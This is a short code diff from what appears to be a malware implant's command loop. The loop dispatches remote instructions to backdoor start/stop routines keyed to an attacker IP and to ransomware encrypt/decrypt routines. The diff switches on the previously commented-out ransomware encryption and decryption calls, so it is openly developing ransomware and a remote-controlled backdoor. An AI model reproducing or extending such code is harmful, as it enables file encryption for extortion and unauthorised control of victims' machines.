@@ -58,12 +58,10 @@ def main():
                     elif result[1] == 'stop': backdoor.stop_backdoor(attacker_ip = result[2])
 
             elif result[0] == 'ransomware':
-                if result[1] == 'encrypt': 
-                    instructions.download_secret_key()
-                    # ransomware.encrypt_ransomware(key = result[2])
+                if result[1] == 'encrypt': ransomware.encrypt_ransomware()
                 elif result[1] == 'decrypt':
                     instructions.download_secret_key()
-                    # ransomware.decrypt_ransomware(key = result[2])
+                    ransomware.decrypt_ransomware()
 
             if result != 'no_data': instructions.reset_instruction()
         elif not result:
